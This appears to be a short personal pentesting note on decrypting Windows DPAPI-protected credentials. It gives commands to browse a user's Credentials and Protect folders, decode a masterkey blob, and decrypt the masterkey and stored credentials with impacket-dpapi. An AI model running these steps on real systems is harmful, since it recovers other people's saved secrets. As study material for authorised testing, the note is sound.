
Credentials folder (Credentials)
```
cd C:\Users\[user]\appdata\Roaming\Microsoft\Credentials
```

Protect folder (Masterkey)
```
cd C:\Users\[user]\appdata\Roaming\Microsoft\Protect
```

```
dir -force
```

Create file, decode base64, and turn it into a binary file
```
echo '[hash]' | base64 -d > ProtectHash.bin
```

SID from Windows Target Protect Folder Directory
```
impacket-dpapi masterkey -file [MasterKeyfilename] -sid [sid] -password '[userPW]'
```

![[Pasted image 20260919075752.png]]

Use the encrypted key
```
impacket-dpapi credential -file [CredentialFile] -key [encyrptedKey]
```

[[Encode Decode]]